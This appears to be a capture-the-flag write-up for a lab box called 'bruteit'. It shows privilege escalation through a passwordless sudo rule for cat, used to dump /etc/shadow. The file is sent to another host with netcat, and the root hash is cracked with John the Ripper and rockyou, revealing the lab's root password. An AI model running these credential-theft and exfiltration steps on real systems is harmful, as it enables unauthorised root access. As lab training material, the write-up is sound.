root passwd: football
****

I'm ssh'ed into john

`id`
```
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
```
he's in sudoers

`sudo -l`
```
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
he can run `cat` with sudo, without passwd!

`sudo cat /etc/shadow > ~/john`
listener:
`nc -lvp port > john_shadow`
sender:
`nc -vn listener_ip port < john`

`john --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt john_shadow`
```
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
```